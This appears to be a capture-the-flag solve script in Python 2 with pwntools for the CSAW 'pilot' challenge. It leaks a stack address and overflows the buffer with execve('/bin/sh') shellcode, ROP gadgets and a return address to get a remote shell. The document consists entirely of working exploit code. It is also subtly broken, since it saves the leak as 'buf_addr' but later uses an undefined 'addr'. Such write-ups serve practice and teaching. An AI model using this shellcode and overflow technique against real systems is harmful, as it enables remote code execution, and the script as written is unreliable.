# coding: utf-8
from pwn import *
context.arch = 'amd64'
#r = process('./pilot')
r = remote('pwn.chal.csaw.io', 8464)
#gdb.attach(r)

#get buffer address
buf_addr = int(r.recvline_contains('Location').split(':')[1],16)
print "Buffer at: {}".format(hex(addr))
r.recvuntil(':')

#do bof
off = 0x20
#0x00000000004007dd : add rsp, 8 ; ret
add_rsp = 0x4007dd
#http://shell-storm.org/shellcode/files/shellcode-806.php
shell =  "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#we call add rsp, 8 ; ret twice so that there is enough room on the stack so the shellcode does not overwrite itself
r.sendline(shell + '\x90'*(off-len(shell)) + p64(0xdeadbeef) + p64(add_rsp)*2 + p64(addr))
r.interactive()
